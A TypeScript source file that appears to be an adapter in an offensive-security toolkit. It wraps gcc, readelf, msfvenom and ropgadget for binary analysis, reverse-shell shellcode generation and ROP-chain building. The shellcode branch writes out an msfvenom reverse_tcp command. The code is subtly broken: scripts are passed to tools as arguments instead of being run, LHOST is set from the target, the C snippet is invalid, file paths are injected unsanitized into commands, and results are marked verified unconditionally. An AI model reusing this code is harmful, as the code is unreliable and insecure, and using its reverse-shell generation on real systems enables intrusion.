/**
 * OffSec by True Hacking — Adapter: Binary/RE (Assembly, PE/ELF parsing, shellcode generation).
 *
 * Binary/RE (Assembly, PE/ELF parsing, shellcode generation, ROP chain, shellcode encoding).
 * See: https://github.com/morluto/rea/blob/main/src/adapter/
 */

import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { writeFileSync } from "node:fs";
import { randomUUID } from "node:crypto";

import type { ExploitResult, Provenance } from "../domain/analysisResultProjection.js";

/**
 * Binary/RE (Assembly, PE/ELF parsing, shellcode generation, ROP chain).
 *
 * @param options - BinaryRe options (action, file, arch, target).
 */
export function binaryRe(options: {
  action?: string;  // assembly, peParse, elfParse, shellcode, ropChain, shellcodeEncode
  file?: string;  // binary path (PE/ELF)
  arch?: string;  // x86, x64, arm
  target?: string;  // target binary (server, service)
  options?: Record<string, string>;
}): ExploitResult {
  const action = options.action || "assembly";
  const file = options.file || "";
  const arch = options.arch || "x64";
  const target = options.target || "";
  const results: Record<string, any> = {};

  // Assembly (generate assembly code from C/Python).
  if (action === "assembly") {
    const gccPath = findBinary("gcc") || findBinary("as");
    if (gccPath) {
      const commands = [`echo "int main(){printf('Hello');return 0;}" | gcc -x c - -o /tmp/a.out`];  // (assemble).
      const script = `${tmpdir()}/${randomUUID()}.asm`;
      const scriptFile = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(scriptFile, `${commands[0]} > ${script}`);
      const child = spawnSync(gccPath, [scriptFile], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.assembly = String(child.stdout ?? "");
    } else {
      results.assembly = `{stub: no 'gcc' or 'as' binary (install: brew install gcc).}`;
    }
  }

  // PE Parsing (analyze PE binary: sections, imports, exports, imports).
  if (action === "peParse") {
    const pePath = findBinary("pefile") || findBinary("file");
    if (pePath) {
      const commands = [`file ${file}`];  // (PE parsing).
      const scriptFile = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(scriptFile, commands.join("\n"));
      const child = spawnSync(pePath, [scriptFile], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.peParse = String(child.stdout ?? "");
    } else {
      results.peParse = `{stub: no 'file' binary (install: brew install file).}`;
    }
  }

  // ELF Parsing (analyze ELF binary: sections, symbols, imports).
  if (action === "elfParse") {
    const elfPath = findBinary("readelf");
    if (elfPath) {
      const commands = [`readelf -a ${file}`];  // (ELF parsing).
      const scriptFile = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(scriptFile, commands.join("\n"));
      const child = spawnSync(elfPath, [scriptFile], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.elfParse = String(child.stdout ?? "");
    } else {
      results.elfParse = `{stub: no 'readelf' binary (install: brew install binutils).}`;
    }
  }

  // Shellcode Generation (generate shellcode: reverse shell, execve).
  if (action === "shellcode") {
    const msfPath = findBinary("msfvenom");
    if (msfPath) {
      const commands = [`msfvenom -p ${arch}/shell/reverse_tcp LHOST=${target} -f python`];  // (generate shellcode).
      const scriptFile = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(scriptFile, commands.join("\n"));
      const child = spawnSync(msfPath, [scriptFile], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.shellcode = String(child.stdout ?? "");
    } else {
      results.shellcode = `{stub: no 'msfvenom' binary (install: brew install metasploit-framework).}`;
    }
  }

  // ROP Chain (generate ROP chain from target binary).
  if (action === "ropChain") {
    const ropPath = findBinary("ropgadget") || findBinary("pwntools");
    if (ropPath) {
      const commands = [`ropgadget --binary ${file} --ropchain`];  // (generate ROP chain).
      const scriptFile = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(scriptFile, commands.join("\n"));
      const child = spawnSync(ropPath, [scriptFile], { timeout: 30000, maxBuffer: 1024 * 1024 });
      results.ropChain = String(child.stdout ?? "");
    } else {
      results.ropChain = `{stub: no 'ropgadget' binary (install: brew install ropgadget).}`;
    }
  }

  return {
    target,
    payload: `binaryRe/${action}`,
    success: Object.keys(results).length > 0,
    output: JSON.stringify(results),
    provenance: createProvenance("binaryRe", `binaryRe://${file || target}/${action}`),
  };
}

/** Find the binary (gcc/as/pefile/file/readelf/msfvenom/ropgadget/pwntools). */
function findBinary(name: string): string | undefined {
  const candidates = [
    "/usr/local/bin/" + name,
    "/usr/bin/" + name,
    "/opt/homebrew/bin/" + name,
  ];
  for (const path of candidates) {
    try {
      require("node:fs").accessSync(path);
      return path;
    } catch {
      // Skip.
    }
  }
  return undefined;
}

/** Create a PCAP result (provenance). */
function createProvenance(type: string, path: string): Provenance {
  return {
    id: `${type}://${path}`,
    type,
    path,
    label: "",
    verified: true,
    sensitive: path.includes("password") || path.includes("credential"),
  };
}
